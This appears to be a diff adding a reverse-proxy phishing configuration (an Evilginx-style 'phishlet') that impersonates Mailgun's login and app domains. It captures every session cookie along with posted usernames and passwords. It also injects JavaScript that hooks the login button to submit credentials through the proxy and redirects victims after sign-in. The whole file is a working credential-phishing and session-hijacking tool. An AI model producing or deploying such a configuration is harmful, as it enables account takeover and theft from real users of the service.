@@ -1,0 +1,49 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'mailgun.com', session: true, is_landing: true}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'mailgun.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'login.mailgun.com', orig_sub: 'login', domain: 'mailgun.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.mailgun.com', orig_sub: 'app', domain: 'mailgun.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.mailgun.com', orig_sub: 'app', domain: 'mailgun.com', search: '<script type="text/javascript" src="/assets/pilot/vendors-0481cf3.bundle.js"></script>', replace: '<script type="text/javascript" src="/assets/pilot/vendors-0481cf3.bundle.js"></script><script>function sleep(ms) {     return new Promise(resolve => setTimeout(resolve, ms)); }   if (window.location.href.indexOf("/app/dashboard") > -1) {     window.location.replace("/app/account/settings"); } else { sleep(25000).then(() => {      window.location.replace("https://login.mailgun.com/login/"); }) }</script>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.mailgun.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/app/dashboard'
+  - '/sessions/sso.*'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.mailgun.com'
+  path: '/login' 
+
+js_inject:
+  - trigger_domains: ["login.mailgun.com"]
+    trigger_paths: ["/login/"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()", 500);
+        return;
+      }
+      function sendPass(){
+        var username = document.getElementsByName("username")[0].value;
+        var pass = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+  
